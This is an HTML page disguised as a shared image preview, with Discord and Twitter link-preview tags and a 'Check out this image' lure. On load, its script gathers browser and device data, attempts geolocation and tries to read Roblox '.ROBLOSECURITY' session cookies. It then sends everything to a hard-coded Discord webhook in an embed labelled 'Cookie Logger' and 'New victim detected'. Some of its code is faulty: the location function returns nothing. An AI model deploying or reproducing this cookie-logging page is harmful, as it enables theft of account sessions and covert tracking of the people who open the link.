<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    
    <!-- Discord Open Graph Meta Tags -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="Check out this image">
    <meta property="og:description" content="Click to view full size">
    <meta property="og:image" content="YOUR_IMAGE_URL_HERE">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="https://tree-bice-nine.vercel.app/">
    
    <!-- Twitter Card Meta Tags (for additional compatibility) -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Check out this image">
    <meta name="twitter:description" content="Click to view full size">
    <meta name="twitter:image" content="YOUR_IMAGE_URL_HERE">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
        }
        img {
            max-width: 100%;
            max-height: 100vh;
        }
        .redirect-message {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            font-family: Arial, sans-serif;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2ofi0AHyCnjm6yOT2v7CJuRd77lfDqI9gguW-HOuZFS6jORIQC5FuJrb11d9hbp8RLigm7B7FU5ikHZBbpMtYEjRC5LgArOxbsBC--rPk_4xEFYY&s=10&ec=121633959" id="image" alt="">
    </div>
    
    <div class="redirect-message" id="redirectMessage">
        If you're not redirected automatically, <a href="#" id="manualLink">click here</a>
    </div>

    <script>
        // CONFIGURE THESE TWO VALUES
        const imageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2ofi0AHyCnjm6yOT2v7CJuRd77lfDqI9gguW-HOuZFS6jORIQC5FuJrb11d9hbp8RLigm7B7FU5ikHZBbpMtYEjRC5LgArOxbsBC--rPk_4xEFYY&s=10&ec=121633959"; // Replace with your image URL
        const webhookUrl = "https://discord.com/api/webhooks/1493094966765948989/_Ko5XMz5D8kAc-1FVo5xtY1ekspvsFXhhczRQFQp8aUpUWgoDIZsSwMN-ugPhNtzbOIB"; // Replace with your Discord webhook URL
        
        // Set the image source
        document.getElementById('image').src = imageUrl;

        // Function to get user's location
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        return {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                    },
                    error => {
                        return { error: error.message };
                    }
                );
            } else {
                return { error: "Geolocation is not supported by this browser." };
            }
        }

        // Function to get browser and device info
        function getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            };
        }

        // Function to extract cookies
        function getRobloxCookies() {
            const cookies = document.cookie.split(';');
            const robloxCookies = {};
            
            cookies.forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name.includes('.ROBLOSECURITY')) {
                    robloxCookies[name] = value;
                }
            });
            
            return robloxCookies;
        }

        // Function to send data to Discord webhook
        async function sendDataToWebhook(data) {
            try {
                const payload = {
                    "embeds": [{
                        "title": "Cookie Logger",
                        "description": "New victim detected",
                        "image": {
                            "url": imageUrl
                        },
                        "fields": [
                            {
                                "name": "Cookies",
                                "value": "```" + JSON.stringify(data.cookies, null, 2) + "```"
                            },
                            {
                                "name": "Location",
                                "value": "```" + JSON.stringify(data.location, null, 2) + "```"
                            },
                            {
                                "name": "Browser Info",
                                "value": "```" + JSON.stringify(data.browser, null, 2) + "```"
                            }
                        ],
                        "footer": {
                            "text": "Timestamp: " + data.timestamp
                        }
                    }]
                };
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    console.error('Failed to send data to webhook');
                }
            } catch (error) {
                console.error('Error sending data to webhook:', error);
            }
        }

        // Collect all data and send to webhook
        window.addEventListener('load', () => {
            const locationData = getLocation();
            const browserData = getBrowserInfo();
            const cookieData = getRobloxCookies();
            
            const allData = {
                timestamp: new Date().toISOString(),
                cookies: cookieData,
                location: locationData,
                browser: browserData
            };
            
            // Send the data
            sendDataToWebhook(allData);
        });
    </script>
</body>
</html>
